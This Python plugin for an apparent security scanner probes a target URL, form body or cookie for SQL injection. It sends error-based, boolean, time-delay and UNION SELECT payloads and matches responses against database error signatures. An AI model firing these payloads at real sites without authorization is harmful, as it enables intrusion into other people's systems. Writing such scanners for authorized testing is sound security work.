import asyncio
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import Any, AsyncIterator

import httpx

from app.plugins.base import PluginBase, PluginEvent, PluginMeta

# SQL error signatures
SQL_ERRORS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your (MySQL|MariaDB)",
    r"ORA-\d{5}",
    r"Oracle.*Driver",
    r"Microsoft.*SQL.*Server",
    r"ODBC.*SQL.*Server",
    r"SQLServer.*JDBC",
    r"Unclosed quotation mark",
    r"pg_query\(\).*ERROR",
    r"PostgreSQL.*ERROR",
    r"PSQLException",
    r"SQLite.*error",
    r"sqlite3\.OperationalError",
    r"SQLSTATE\[\w+\]",
    r"syntax error.*SQL",
    r"you have an error in your sql",
]
SQL_ERROR_RE = re.compile("|".join(SQL_ERRORS), re.IGNORECASE)


class SqlInject(PluginBase):
    meta = PluginMeta(
        name="sql-inject",
        version="1.0.0",
        description="SQL 注入检测",
        category="vuln",
        engine="python",
    )

    async def execute(self, params: dict[str, Any]) -> AsyncIterator[PluginEvent]:
        url = params["url"].strip()
        method = params.get("method", "GET").upper()
        post_data = params.get("post_data", "").strip()
        cookie = params.get("cookie", "").strip()
        timeout = int(params.get("timeout", 10))

        yield PluginEvent(type="log", data={"msg": f"SQL injection scan: {method} {url}"})
        yield PluginEvent(type="progress", data={"percent": 0, "msg": "Preparing injection points..."})

        # Find injection points (marked with *)
        injection_points = []
        if "*" in url:
            injection_points.append(("url", url))
        if "*" in post_data:
            injection_points.append(("body", post_data))
        if "*" in cookie:
            injection_points.append(("cookie", cookie))

        # If no * markers, test all GET params
        if not injection_points:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            for param_name in qs:
                marked_qs = dict(qs)
                marked_qs[param_name] = [qs[param_name][0] + "*"]
                new_query = urlencode(marked_qs, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))
                injection_points.append(("url", new_url))

        if not injection_points:
            yield PluginEvent(type="log", data={"msg": "No injection points found. Use * to mark injection point."})
            yield PluginEvent(type="progress", data={"percent": 100, "msg": "No injection points"})
            return

        total_tests = len(injection_points) * 5  # 5 test types per point
        done = 0
        found = 0

        async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
            for position, target in injection_points:
                param_name = self._extract_param_name(position, target)
                yield PluginEvent(type="log", data={"msg": f"\nTesting: {param_name} ({position})"})

                # Get baseline response
                baseline_url, baseline_body, baseline_cookie = self._build_request(url, post_data, cookie, position, target, "")
                try:
                    baseline = await self._send(client, method, baseline_url, baseline_body, baseline_cookie)
                except Exception as e:
                    yield PluginEvent(type="log", data={"msg": f"  Baseline request failed: {e}"})
                    done += 5
                    continue
                baseline_len = len(baseline.text)

                # Test 1: Error-based injection
                yield PluginEvent(type="log", data={"msg": "  Testing error-based injection..."})
                for payload in ["'", '"', "\\", "')", "';", "' AND '1'='1"]:
                    req_url, req_body, req_cookie = self._build_request(url, post_data, cookie, position, target, payload)
                    try:
                        resp = await self._send(client, method, req_url, req_body, req_cookie)
                        match = SQL_ERROR_RE.search(resp.text)
                        if match:
                            found += 1
                            yield PluginEvent(type="result", data={
                                "param": param_name, "position": position,
                                "type": "Error-based", "payload": payload,
                                "evidence": match.group()[:100],
                            })
                            yield PluginEvent(type="log", data={"msg": f"  [VULN] Error-based: {payload}"})
                            break
                    except Exception:
                        pass
                done += 1

                # Test 2: Boolean-based blind
                yield PluginEvent(type="log", data={"msg": "  Testing boolean-based blind..."})
                for true_p, false_p in [("' OR '1'='1", "' OR '1'='2"), ("1 OR 1=1", "1 OR 1=2"), ("' OR 1=1--", "' OR 1=2--")]:
                    try:
                        url_t, body_t, cookie_t = self._build_request(url, post_data, cookie, position, target, true_p)
                        url_f, body_f, cookie_f = self._build_request(url, post_data, cookie, position, target, false_p)
                        resp_t = await self._send(client, method, url_t, body_t, cookie_t)
                        resp_f = await self._send(client, method, url_f, body_f, cookie_f)
                        diff = abs(len(resp_t.text) - len(resp_f.text))
                        if diff > 50 and abs(len(resp_t.text) - baseline_len) > 50:
                            found += 1
                            yield PluginEvent(type="result", data={
                                "param": param_name, "position": position,
                                "type": "Boolean blind", "payload": true_p,
                                "evidence": f"True/False response diff: {diff} chars",
                            })
                            yield PluginEvent(type="log", data={"msg": f"  [VULN] Boolean blind: diff={diff}"})
                            break
                    except Exception:
                        pass
                done += 1

                # Test 3: Time-based blind
                yield PluginEvent(type="log", data={"msg": "  Testing time-based blind..."})
                for payload in ["' OR SLEEP(3)--", "1; WAITFOR DELAY '0:0:3'--", "' OR pg_sleep(3)--"]:
                    try:
                        req_url, req_body, req_cookie = self._build_request(url, post_data, cookie, position, target, payload)
                        t0 = time.monotonic()
                        await self._send(client, method, req_url, req_body, req_cookie)
                        elapsed = time.monotonic() - t0
                        if elapsed >= 2.5:
                            found += 1
                            yield PluginEvent(type="result", data={
                                "param": param_name, "position": position,
                                "type": "Time blind", "payload": payload,
                                "evidence": f"Response delayed {elapsed:.1f}s",
                            })
                            yield PluginEvent(type="log", data={"msg": f"  [VULN] Time blind: {elapsed:.1f}s delay"})
                            break
                    except Exception:
                        pass
                done += 1

                # Test 4: Integer injection
                yield PluginEvent(type="log", data={"msg": "  Testing integer injection..."})
                for payload in ["1 AND 1=1", "1 AND 1=2"]:
                    try:
                        req_url, req_body, req_cookie = self._build_request(url, post_data, cookie, position, target, payload)
                        resp = await self._send(client, method, req_url, req_body, req_cookie)
                        if payload.endswith("1=1") and abs(len(resp.text) - baseline_len) < 50:
                            # True condition matches baseline, now check false
                            req_url2, req_body2, req_cookie2 = self._build_request(url, post_data, cookie, position, target, "1 AND 1=2")
                            resp2 = await self._send(client, method, req_url2, req_body2, req_cookie2)
                            if abs(len(resp2.text) - baseline_len) > 50:
                                found += 1
                                yield PluginEvent(type="result", data={
                                    "param": param_name, "position": position,
                                    "type": "Integer injection", "payload": "1 AND 1=1 / 1 AND 1=2",
                                    "evidence": f"True={len(resp.text)}, False={len(resp2.text)}, Baseline={baseline_len}",
                                })
                                yield PluginEvent(type="log", data={"msg": "  [VULN] Integer injection detected"})
                            break
                    except Exception:
                        pass
                done += 1

                # Test 5: UNION injection probe
                yield PluginEvent(type="log", data={"msg": "  Testing UNION injection..."})
                for cols in range(1, 11):
                    null_list = ",".join(["NULL"] * cols)
                    payload = f"' UNION SELECT {null_list}--"
                    try:
                        req_url, req_body, req_cookie = self._build_request(url, post_data, cookie, position, target, payload)
                        resp = await self._send(client, method, req_url, req_body, req_cookie)
                        if not SQL_ERROR_RE.search(resp.text) and resp.status_code == 200:
                            found += 1
                            yield PluginEvent(type="result", data={
                                "param": param_name, "position": position,
                                "type": "UNION injection", "payload": payload,
                                "evidence": f"UNION with {cols} columns succeeded",
                            })
                            yield PluginEvent(type="log", data={"msg": f"  [VULN] UNION injection: {cols} columns"})
                            break
                    except Exception:
                        pass
                done += 1

                pct = min(done * 100 // max(total_tests, 1), 99)
                yield PluginEvent(type="progress", data={"percent": pct, "msg": f"Tested {done}/{total_tests}"})

        summary = f"Scan complete: {found} injection points found"
        yield PluginEvent(type="log", data={"msg": summary})
        yield PluginEvent(type="progress", data={"percent": 100, "msg": summary})

    def _extract_param_name(self, position: str, target: str) -> str:
        if position == "url":
            parsed = urlparse(target)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            for k, v in qs.items():
                if v and "*" in v[0]:
                    return k
            return "url-path"
        elif position == "body":
            for pair in target.split("&"):
                if "*" in pair and "=" in pair:
                    return pair.split("=")[0]
        elif position == "cookie":
            for pair in target.split(";"):
                if "*" in pair and "=" in pair:
                    return pair.split("=")[0].strip()
        return position

    def _build_request(self, url, post_data, cookie, position, target, payload):
        """Replace * marker with payload in the correct position."""
        req_url = url.replace("*", "") if "*" in url else url
        req_body = post_data.replace("*", "") if post_data else None
        req_cookie = cookie.replace("*", "") if cookie else None

        if position == "url":
            req_url = target.replace("*", payload)
        elif position == "body":
            req_body = target.replace("*", payload)
        elif position == "cookie":
            req_cookie = target.replace("*", payload)

        return req_url, req_body, req_cookie

    async def _send(self, client, method, url, body, cookie):
        headers = {}
        if cookie:
            headers["Cookie"] = cookie
        return await client.request(method, url, content=body, headers=headers)
